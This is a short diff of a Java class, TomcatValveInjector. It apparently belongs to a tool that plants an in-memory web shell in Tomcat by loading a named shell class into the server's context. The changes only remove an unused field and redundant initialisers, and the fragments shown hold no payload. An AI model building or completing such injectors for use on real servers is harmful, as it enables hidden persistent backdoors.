@@ -13,10 +13,9 @@ import java.util.zip.GZIPInputStream;
  */
 public class TomcatValveInjector {
 
-    private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public TomcatValveInjector() {
         if (ok) {
@@ -40,7 +39,6 @@ public class TomcatValveInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     public Set<Object> getContext() throws Exception {
@@ -83,7 +81,7 @@ public class TomcatValveInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
